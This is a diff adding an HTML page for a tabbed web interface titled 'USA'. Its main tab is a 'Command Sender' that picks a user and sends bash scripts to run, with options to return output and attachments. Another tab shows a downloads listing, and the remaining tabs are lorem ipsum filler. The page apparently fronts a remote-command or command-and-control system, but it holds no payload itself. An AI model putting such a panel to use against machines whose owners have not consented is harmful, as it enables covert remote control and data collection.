@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+	<title>USA</title>
+	<script src="js/jquery-1.11.3.min.js"></script>
+	<script src="js/custom.js"></script>
+	<link rel="stylesheet" href="css/base.css"/>
+	<link rel="stylesheet" href="css/iosOverlay.css">
+	<link rel="stylesheet" href="css/tabs.css">
+</head>
+<body>
+	<p />
+	<ul id="tabs">
+		<li><a href="#" title="tab1">One</a></li>
+		<li><a href="#" title="tab2" onclick="document.getElementById('downloadFrm').src='/downloads/';">Two</a></li>
+		<li><a href="#" title="tab3">Three</a></li>
+		<li><a href="#" title="tab4">Four</a></li>
+	</ul>
+	<div id="content">
+	  <div id="tab1">
+		<form action="" method="post" class="smart-green">
+			<h1>Command Sender
+				<span>Please fill the shell in the textarea.</span>
+			</h1>
+			<label>
+			<span>To :</span>
+			<select id="user_list">
+			</select>
+			</label>
+			<label>
+			<span>Command Type :</span>
+			<select id="cmd_type">
+				<option value="1">run</option>
+				<option value="2">run & return</option>
+				<option value="3">run & return with attch</option>
+			</select>
+			</label>
+			<label>
+			<span>Args :</span>
+			<input id="args" type="text" name="args" placeholder="args" />
+			</label>
+			<label>
+			<span>Shell :</span>
+			<textarea id="message" name="message">#!/bin/bash
+</textarea>
+			</label>
+			<label>
+			<span>&nbsp;</span>
+			<input type="button" id="sendbtn" class="button" value="Send" />
+			</label>
+		</form>
+	  </div>
+	  <div id="tab2">
+		<iframe id="downloadFrm" width="100%" scrolling="auto" marginwidth="0"i marginheight="0" height="500" frameborder="0" src=""></iframe>
+	  </div>
+	  <div id="tab3">
+	    <h2>Phasellus non nibh</h2>
+	    <p>Non erat laoreet ullamcorper. Pellentesque magna metus, feugiat eu elementum sit amet, cursus sed diam. Curabitur posuere porttitor lorem, eu malesuada tortor faucibus sed.</p>
+	    <h3>Duis pulvinar nibh vel urna</h3>
+	    <p>Donec purus leo, porttitor eu molestie quis, porttitor sit amet ipsum. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Donec accumsan ornare elit id imperdiet. </p>
+	    <p>Suspendisse ac libero mauris. Cras lacinia porttitor urna, vitae molestie libero posuere et. </p>
+	  </div>
+	  <div id="tab4">
+	    <h2>Cum sociis natoque penatibus</h2>
+	    <p>Magnis dis parturient montes, nascetur ridiculus mus. Nullam ac massa quis nisi porta mollis venenatis sit amet urna. Ut in mauris velit, sed bibendum turpis.</p>
+	    <p>Nam ornare vulputate risus, id volutpat elit porttitor non. In consequat nisi vel lectus dapibus sodales. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Praesent bibendum sagittis libero.</p>
+	    <h3>Imperdiet sem interdum nec</h3>
+	    <p>Mauris rhoncus tincidunt libero quis fringilla.</p>
+	  </div>
+	</div>
+<script src="js/iosOverlay.js"></script>
+<script src="js/spin.min.js"></script>
+<script>
+$(document).ready(function() {
+	$("#content div").hide(); // Initially hide all content
+	$("#tabs li:first").attr("id","current"); // Activate first tab
+	$("#content div:first").fadeIn(); // Show first tab content
+    
+    $('#tabs a').click(function(e) {
+        e.preventDefault();        
+        $("#content div").hide(); //Hide all content
+        $("#tabs li").attr("id",""); //Reset id's
+        $(this).parent().attr("id","current"); // Activate this
+        $('#' + $(this).attr('title')).fadeIn(); // Show content for current tab
+    });
+});
+</script>
+</body>
+</html>
